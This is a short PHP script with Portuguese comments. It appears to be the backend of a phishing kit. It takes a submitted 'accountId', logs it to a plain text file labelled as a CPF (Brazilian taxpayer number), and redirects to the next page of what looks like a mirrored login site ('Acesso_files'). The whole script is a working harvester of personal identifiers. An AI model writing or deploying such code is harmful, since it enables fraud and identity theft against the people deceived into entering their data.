<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capturando o valor do input "accountId"
    $accountId = $_POST['accountId'];

    // Caminho do arquivo onde os dados serão salvos (certifique-se que tenha permissões de escrita)
    $file = 'logs.txt';

    // Abre o arquivo em modo de escrita (modo "a" - append, adicionando ao final do arquivo)
    $handle = fopen($file, 'a');

    // Escreve o Account ID no arquivo com o prefixo "CPF:" e prepara nova linha
    fwrite($handle, "CPF: " . $accountId . "\n");

    // Fecha o arquivo
    fclose($handle);

    // Redireciona para outra página após salvar o Account ID (altere "outra_pagina.php" para a URL desejada)
    ob_start();
    header("Location: /Acesso_files/2/index.html");
    ob_end_flush();
    exit(); // Certifica-se de que o script seja encerrado após o redirecionamento
}
?>
